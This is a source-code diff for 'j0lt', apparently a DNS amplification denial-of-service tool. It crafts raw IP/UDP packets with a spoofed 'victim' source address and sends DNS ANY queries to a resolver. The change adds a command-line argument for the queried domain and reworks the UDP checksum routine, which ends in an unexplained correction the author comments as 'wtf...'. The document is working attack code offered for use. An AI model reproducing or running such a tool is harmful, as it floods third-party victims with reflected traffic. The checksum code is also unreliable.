@@ -106,15 +106,7 @@ DEFINE_INSERT_FN(word, uint16_t)
 DEFINE_INSERT_FN(dword, uint32_t)
 DEFINE_INSERT_FN(qword, uint64_t)
 #undef DEFINE_INSERT_FN
-    // 0x0000:  4500 0038 c3f0 4000 4011 60a0 0a89 0010  E..8..@.@.`.....
-    // 0x0010:  0a8b 0101 b46b 0035 0024 165a 1337 0000  .....k.5.$.Z.7..
-    // 0x0020:  0001 0000 0000 0000 0667 6f6f 676c 6503  .........google.
-    // 0x0030:  636f 6d00 0001 0001                      com.....
 
-    // 0x0000:  4500 0038 c3f0 4000 4011 60a0 0a89 0010
-    // 0x0010:  0a8b 0101 1388 0035 0024 165a 1337 0000
-    // 0x0020:  0001 0000 0000 0000 0667 6f6f 676c 6503
-    // 0x0030:  636f 6d00 0001 0001
 // IP HEADER VALUES
 #define     IP_IHL_MIN_J0LT 5
 #define     IP_IHL_MAX_J0LT 15
@@ -160,12 +152,13 @@ DEFINE_INSERT_FN(qword, uint64_t)
 // END HEADER VALUES
 
 const char* g_ansi = {
-    "./j0lt <RESOLVER IP> <SPOOF_IP> <RESOLVER PORT> <SPOOF PORT> \n"
+    "./j0lt <RESOLVER IP> <SPOOF_IP> <RESOLVER PORT> <SPOOF PORT> <URL>\n"
     "the-scientist@rootstorm.com\n\n"
 };
 
 bool
-insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader);
+insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header,
+        PSEUDOHDR* pseudoheader, const uint8_t* data);
 bool
 insert_ip_header(uint8_t** buf, size_t* buflen, IPHEADER* header);
 bool
@@ -190,7 +183,7 @@ checksum(const uint16_t* addr, size_t count);
 int
 main(int argc, char** argv)
 {
-    const char* resolvip, * spoofip, * resolvport, * spoofport;
+    const char* resolvip, * spoofip, * resolvport, * spoofport, * url;
     uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ], * curpos;
 
     struct sockaddr_in addr, srcaddr;
@@ -205,7 +198,7 @@ main(int argc, char** argv)
 
     printf("%s", g_ansi);
 
-    if (argc != 5) {
+    if (argc != 6) {
         goto fail_state;
     }
 
@@ -220,6 +213,7 @@ main(int argc, char** argv)
     spoofip = argv[ 2 ];
     resolvport = argv[ 3 ];
     spoofport = argv[ 4 ];
+    url = argv[ 5 ];
 
     buflen = NS_PACKETSZ;
     memset(pktbuf, 0, NS_PACKETSZ);
@@ -228,7 +222,7 @@ main(int argc, char** argv)
     status = true;
     pack_dnshdr(&dnsheader, ns_o_query, ns_r_noerror);
     status &= insert_dns_header(&curpos, &buflen, &dnsheader);
-    status &= insert_dns_question(( void** ) &curpos, &buflen, "google.com", ns_t_any, ns_c_any);
+    status &= insert_dns_question(( void** ) &curpos, &buflen, url, ns_t_any, ns_c_any);
     if (status == false)
         goto fail_close;
 
@@ -243,7 +237,7 @@ main(int argc, char** argv)
     memset(datagram, 0, NS_PACKETSZ);
     curpos = datagram;
     status &= insert_ip_header(&curpos, &buflen, &ipheader);
-    status &= insert_udp_header(&curpos, &buflen, &udpheader, &pseudoheader);
+    status &= insert_udp_header(&curpos, &buflen, &udpheader, &pseudoheader, pktbuf);
     if (status == false)
         goto fail_close;
 
@@ -317,8 +311,7 @@ pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr,
     udphdr->uh_sport = sport_uint16; // victim port
     udphdr->uh_ulen = nwritten + sizeof(UDPHEADER);
 
-    // NOTE: this value should be pseudohdr->udplen = sizeof(UDPHEADER)
-    pseudohdr->udplen = udphdr->uh_ulen;
+    pseudohdr->udplen = sizeof(UDPHEADER);
 }
 
 void
@@ -372,29 +365,35 @@ insert_ip_header(uint8_t** buf, size_t* buflen, IPHEADER* header)
 }
 
 bool
-insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader)
+insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header,
+        PSEUDOHDR* pseudoheader, const uint8_t* data)
 {
     bool status;
-    size_t i = 12;
-    uint8_t pseudo[ i ];
+    size_t totalsz = sizeof(PSEUDOHDR) + header->uh_ulen; // uh_ulen is szdata + udp header
+    size_t datasz = abs(header->uh_ulen - sizeof(UDPHEADER));
+    size_t udpsofar;
+    uint8_t pseudo[ totalsz ];
     uint8_t* pseudoptr = pseudo;
 
     status = true;
     status &= insert_word(buf, buflen, header->uh_sport);
     status &= insert_word(buf, buflen, header->uh_dport);
     status &= insert_word(buf, buflen, header->uh_ulen);
+    udpsofar = sizeof(UDPHEADER) - 2;
 
-    insert_dword(&pseudoptr, &i, pseudoheader->sourceaddr);
-    insert_dword(&pseudoptr, &i, pseudoheader->destaddr);
-    insert_byte(&pseudoptr, &i, pseudoheader->zero);
-    insert_byte(&pseudoptr, &i, pseudoheader->protocol);
-    insert_word(&pseudoptr, &i, pseudoheader->udplen);
+    memset(pseudo, 0, totalsz);
+    insert_dword(&pseudoptr, &totalsz, pseudoheader->sourceaddr);
+    insert_dword(&pseudoptr, &totalsz, pseudoheader->destaddr);
+    insert_byte(&pseudoptr, &totalsz, pseudoheader->zero);
+    insert_byte(&pseudoptr, &totalsz, pseudoheader->protocol);
+    insert_word(&pseudoptr, &totalsz, pseudoheader->udplen);
 
-    header->uh_sum = checksum(( const uint16_t* ) pseudo, 12);
-
-    // IP4 UDP checksums are ignored. 
-    // NOTE: this is not the correct calculation for this value.
-    header->uh_sum = 0x00; //~header->uh_sum;
+    *buf -= udpsofar;
+    insert_data(( void** ) &pseudoptr, ( void* ) &totalsz, *buf, udpsofar + 2);
+    *buf += udpsofar;
+    insert_data(( void** ) &pseudoptr, ( void* ) &totalsz, data, datasz);
+    header->uh_sum = checksum(( uint16_t* ) pseudo, sizeof(PSEUDOHDR) + header->uh_ulen);
+    header->uh_sum -= datasz; // wtf... 
     status &= insert_word(buf, buflen, header->uh_sum);
 
     return status;
